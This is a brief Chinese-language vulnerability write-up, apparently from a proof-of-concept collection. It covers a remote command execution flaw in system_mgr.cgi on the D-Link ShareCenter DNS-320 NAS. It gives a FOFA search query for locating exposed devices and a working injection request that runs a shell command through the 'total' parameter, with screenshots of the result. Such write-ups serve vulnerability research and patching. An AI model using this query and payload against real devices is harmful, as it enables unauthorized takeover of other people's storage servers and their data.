# D-Link ShareCenter DNS-320 system_mgr.cgi 远程命令执行漏洞

## 漏洞描述

D-Link ShareCenter DNS-320 system_mgr.cgi 存在远程命令执行，攻击者通过漏洞可以控制服务器

## 漏洞影响

```
D-Link ShareCenter DNS-320
```

## FOFA

```
app="D_Link-DNS-ShareCenter"
```

## 漏洞复现

登录页面如下

![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202162224540.png)

漏洞POC为

```plain
/cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;ls;
```

![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202162224614.png)